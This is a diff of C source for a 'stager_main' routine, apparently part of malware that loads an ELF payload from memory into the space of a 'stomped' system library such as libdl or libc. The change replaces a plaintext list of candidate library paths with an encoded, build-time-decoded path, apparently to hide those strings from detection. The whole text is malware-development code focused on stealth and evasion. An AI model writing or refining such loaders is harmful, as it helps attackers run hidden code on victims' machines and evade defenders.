@@ -69,31 +69,12 @@ void stager_main(long *sp) {
   size_t dl_base = 0;
   size_t dl_entry_addr = 0;
   size_t dl_mapped_size = 0;
-  char dl_module_path[64] = {0};
+  char dl_module_path[256] = {0};
   
-  // Try to find a universal library for stomping
-  const char *candidates[] = {
-      "/lib/x86_64-linux-gnu/libdl.so.2",
-      "/lib64/libdl.so.2",
-      "/usr/lib/x86_64-linux-gnu/libdl.so.2",
-      "/lib/x86_64-linux-gnu/librt.so.1",
-      "/lib64/librt.so.1",
-      "/lib/x86_64-linux-gnu/libc.so.6",
-      "/lib64/libc.so.6"
-  };
-  
-  for (int i = 0; i < 7; i++) {
-      int fd = open(candidates[i], O_RDONLY, 0);
-      if (fd >= 0) {
-          close(fd);
-          long len = strlen(candidates[i]);
-          if (len < 63) {
-            memcpy(dl_module_path, candidates[i], len);
-            dl_module_path[len] = '\0';
-            break;
-          }
-      }
-  }
+#ifdef ENCODED_LIB_PATH
+  static const unsigned char encoded_lib_path[] = {ENCODED_LIB_PATH};
+  decode_config_string(dl_module_path, encoded_lib_path, sizeof(dl_module_path));
+#endif
 
   // elf_load arguments: char *elf_start, void *stack, int stack_size, size_t *base_addr, size_t *entry, size_t *mapped_size, int pre_mapped, const char *module_path
   int ret = elf_load((char *)dl_mem, NULL, 0, &dl_base, &dl_entry_addr, &dl_mapped_size, 0, dl_module_path[0] ? dl_module_path : NULL);
